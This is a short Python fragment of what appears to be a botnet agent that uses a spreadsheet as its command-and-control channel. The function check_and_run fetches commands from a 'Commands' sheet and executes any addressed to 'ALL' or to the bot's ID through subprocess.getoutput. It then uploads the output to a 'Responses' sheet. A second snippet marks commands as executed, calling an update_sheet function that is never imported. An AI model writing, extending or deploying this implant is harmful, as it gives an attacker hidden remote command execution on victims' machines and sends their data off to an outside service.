import subprocess, time
from core.sheets_api import read_sheet, append_to_sheet

def check_and_run(bot_id):
    commands = read_sheet("Commands")
    headers = commands[0]
    for row in commands[1:]:
        target, cmd, ts, executed = row[:4]
        if target in ["ALL", bot_id] and executed.upper() != "YES":
            print(f"[C2] Running: {cmd}")
            output = subprocess.getoutput(cmd)
            append_to_sheet("Responses", [
                bot_id, cmd, output[:500], time.ctime()
            ])
# In c2_commander.py
if target in ["ALL", bot_id] and executed.upper() != "YES":
    # ... execute command ...
    # Update the sheet to mark as executed
    update_sheet("Commands", commands.index(row), 3, "YES")
    